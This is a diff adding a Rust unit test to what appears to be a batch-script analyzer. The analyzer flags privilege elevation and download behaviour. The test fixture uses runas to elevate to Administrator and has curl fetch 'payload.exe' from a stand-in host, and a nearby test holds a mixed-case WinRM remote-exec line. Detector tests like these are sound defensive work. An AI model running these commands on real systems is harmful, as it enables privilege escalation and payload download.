@@ -1326,6 +1326,34 @@ mod echo_tests {
     }
 
     #[test]
+    fn native_runas_replays_quoted_child_command() {
+        let script = br#"echo url = "https://runas-native.example/payload.exe" > curl.cfg
+runas /user:Administrator "cmd.exe /c curl -K curl.cfg -o payload.exe""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target == "cmd.exe"
+                        && args.as_deref() == Some("/c curl -K curl.cfg -o payload.exe")
+            )),
+            "native runas SelfElevation not detected: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://runas-native.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "native runas child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn remote_exec_mixed_case_tokens_emit_trait() {
         let script = b"@echo off\r\nwInRm InVoKe 10.0.0.5\r\n";
         let report = analyze(script, &AnalyzeConfig::default());
